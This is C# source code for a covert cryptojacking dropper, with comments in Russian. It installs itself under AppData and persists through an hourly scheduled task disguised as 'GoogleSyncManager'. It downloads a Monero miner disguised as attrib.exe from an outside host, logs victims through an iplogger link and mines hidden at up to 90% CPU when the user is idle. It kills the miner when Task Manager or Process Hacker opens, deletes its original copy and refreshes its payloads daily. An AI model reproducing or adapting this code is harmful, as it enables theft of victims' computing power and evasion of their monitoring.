﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using lmnr.Internals;
using Microsoft.Win32;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.ComponentModel;

namespace lmnr
{


    class Program
    {


        public static String mainexeproc = Process.GetCurrentProcess().MainModule.FileName;

        public static String cmnr = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\attrib.exe";
        public static String dwizold = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\lmnr-old.exe";
        public static String dwiz = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\lmnr.exe";

        public static String miner_exe = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\attrib.exe";
        public static String build_exe = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\lmnr.exe";

        public static String file_zip = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinLic.zip";
        public static String file_task = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\task.exe";
        public static String file_zip2 = Environment.ExpandEnvironmentVariables("%AppData%");
        public static String Mainpath = System.Reflection.Assembly.GetExecutingAssembly().Location;


        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);

        [Flags]
        public enum EXECUTION_STATE : uint
        {
            ES_AWAYMODE_REQUIRED = 0x00000040,
            ES_CONTINUOUS = 0x80000000,
            ES_DISPLAY_REQUIRED = 0x00000002,
            ES_SYSTEM_REQUIRED = 0x00000001
            // Legacy flag, should not be used.
            // ES_USER_PRESENT = 0x00000004
        }

    /*    void PreventSleep()
        {
            // Prevent Idle-to-Sleep (monitor not affected) (see note above)
            SetThreadExecutionState(EXECUTION_STATE.ES_CONTINUOUS | EXECUTION_STATE.ES_AWAYMODE_REQUIRED);
        }

    */



        internal struct LASTINPUTINFO
        {
            public uint cbSize;

            public uint dwTime;
        }


        /// <summary>
        /// Helps to find the idle time, (in milliseconds) spent since the last user input
        /// </summary>

        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [DllImport("Kernel32.dll")]
        private static extern uint GetLastError();


        static void Main(string[] args)
        {


            Process.Start(new ProcessStartInfo
            {
                Arguments = ("/create /tn GoogleSyncManager /tr " + build_exe + " /sc hourly /f"),
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = false,
                FileName = "schtasks"
            });




            if (build_exe == mainexeproc)
            {
                string procName = Process.GetCurrentProcess().ProcessName;
                int c = 0;
                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    if (process.ProcessName.Contains(procName))
                    {
                        c++;
                        if (c > 1)
                        {

                            return;
                        }
                    }
                }


                if (File.Exists(miner_exe))
                {
                    // nothing
                }
                else
                {
                    WebClient Client = new WebClient();
                    Client.DownloadFile("https://qubiq.xyz/attrib.exe", miner_exe);

                }

                    string site = "https://iplogger.com/1fV457";

                    HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(site);
                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();



                Thread lmnrmain = new Thread(new ThreadStart(mainThread));
                lmnrmain.Start();
                Thread ThreadUpdateFiles = new Thread(new ThreadStart(Count));
                ThreadUpdateFiles.Start(); // запускаем поток

              Thread Nosleepmode = new Thread(new ThreadStart(Nosleep));
              Nosleepmode.Start();


                if (File.Exists(dwizold))
                {
                    File.Delete(dwizold);
                }

                // создаем новый поток SystemExplorerService64.exe
                while (true) { 
                Process[] task1 = Process.GetProcessesByName("taskmgr");
                Process[] task2 = Process.GetProcessesByName("SystemExplorer");
                Process[] task3 = Process.GetProcessesByName("ProcessHacker");
                if (task1.Length > 0 || task2.Length > 0 || task3.Length > 0)
                {
                        //Убиваем 
                        lmnrmain.Abort();
                        lmnrmain.Join();
                        foreach (Process proc in Process.GetProcessesByName("attrib"))
                        {
                            proc.Kill();
                        }
                       // Console.WriteLine("Поток прерван");
                        RunWithDelay();
                        Environment.Exit(0);



                }
                else
                {
                   // Console.WriteLine("Проверка на Диспетчер пройдена");
                }
                    Thread.Sleep(1000);
                }




            }
            else
            {
                File.Copy(Mainpath, build_exe, true);
                Process.Start(build_exe);
                SelfDelete("3");


            }

        }

        public static uint GetIdleTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(lastInPut);
            GetLastInputInfo(ref lastInPut);

            return ((uint)Environment.TickCount - lastInPut.dwTime);
        }
        /// <summary>
        /// Get the Last input time in milliseconds
        /// </summary>
        /// <returns></returns>
        public static long GetLastInputTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(lastInPut);
            if (!GetLastInputInfo(ref lastInPut))
            {
                throw new Exception(GetLastError().ToString());
            }
            return lastInPut.dwTime;
        }

        public static void SelfDelete(string delay)
        {
            Process.Start(new ProcessStartInfo
            {
                Arguments = "/C choice /C Y /N /D Y /T " + delay + " & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }


        public static void mainThread()
        {
            string idlearg = "-o stratum+tcp://fcn-xmr.pool.minergate.com:45590 -u avtoritet1337@gmail.com -p x -k --max-cpu-usage=90 --donate-level=1";
            string noidlearg = "-o stratum+tcp://fcn-xmr.pool.minergate.com:45590 -u avtoritet1337@gmail.com -p x -k --max-cpu-usage=50 --donate-level=1";

            int i = 0;

            while (true)
            {




                if (GetIdleTime() > 600000)
                {


                    if (i == 1)
                    {
                        foreach (Process proc in Process.GetProcessesByName("attrib"))
                        {
                            proc.Kill();
                        }

                        ProcessStartInfo mnrexe = new ProcessStartInfo(miner_exe);
                        mnrexe.UseShellExecute = false;
                        mnrexe.CreateNoWindow = true;
                        mnrexe.Arguments = (idlearg);
                        Process.Start(mnrexe);
                        //Console.WriteLine("Работаем на 90%");


                        i = 0;


                    }



                }
                else
                {




                    if (i == 0)
                    {
                        foreach (Process proc in Process.GetProcessesByName("attrib"))
                        {
                            proc.Kill();
                        }

                        ProcessStartInfo mnrexe = new ProcessStartInfo(miner_exe);
                        mnrexe.UseShellExecute = false;
                        mnrexe.CreateNoWindow = true;
                        mnrexe.Arguments = (noidlearg);
                        Process.Start(mnrexe);
                       // Console.WriteLine("Работаем на 50%");

                        i = 1;


                    }


                }




                Thread.Sleep(666);
            }
        }

        public static void RunWithDelay()
        {
            Process.Start(new ProcessStartInfo
            {
                Arguments = "/C choice /C Y /N /D Y /T 10 & START \"\" \"" + dwiz + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }

        public static void Count()
        {
            while (true)
            {
                AutoRenewalFiles("https://qubiq.xyz/attrib.exe", "https://qubiq.xyz/lmnr.exe");

                Thread.Sleep(10000);


            }
        }


        public static void Nosleep()
        {
            while (true)
            {
                SetThreadExecutionState(EXECUTION_STATE.ES_CONTINUOUS | EXECUTION_STATE.ES_AWAYMODE_REQUIRED);

                Thread.Sleep(10000);


            }
        }

        public static void AutoRenewalFiles(string attribURL, string lmnrURL)
        {

            DateTime lastmodif = File.GetLastWriteTime(cmnr);

            string today = DateTime.Today.ToString("dd-MM-yyyy");

            string filedate = lastmodif.ToString("dd-MM-yyyy");

            if (filedate == today)
            {
                Console.WriteLine("Сегодня уже не надо качать.attrib Новый");


            }
            else
            {

                Console.WriteLine("Сегодня надо качать.attrib устарел");


                try
                {

                    foreach (Process proc in Process.GetProcessesByName("attrib"))
                    {
                        proc.Kill();
                    }
                    if (File.Exists(cmnr))
                    {
                        File.Delete(cmnr);

                    }
                    WebClient Client = new WebClient();
                    Client.DownloadFile(attribURL, cmnr);

                    if (File.Exists(dwiz))
                    {
                        File.Move(dwiz, dwizold);
                    }

                    WebClient Dwiz = new WebClient();
                    Dwiz.DownloadFile(lmnrURL, dwiz);
                    Console.WriteLine("Main File Downloaded");
                    

         



                }

                catch (Exception ex)

                {
                    Console.WriteLine("Опа,чет не обновило attrib или lmnr");
                    return;
                }



            }


        }

        


    }
}